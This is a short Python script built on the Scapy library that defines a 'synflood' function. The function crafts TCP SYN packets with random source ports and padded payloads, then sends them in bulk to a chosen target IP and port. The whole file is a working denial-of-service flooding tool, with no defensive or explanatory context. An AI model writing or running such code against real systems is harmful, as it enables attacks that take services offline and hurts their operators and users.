from scapy.all import *

def synflood (targetip, targetport, number, size):
    ip = IP(dst=targetip)
    tcp = TCP(sport=RandShort(), dport=targetport, flags="S")
    data = Raw(b"X" * size)
    p = ip / tcp / data
    send(p, count=number, verbose=0)
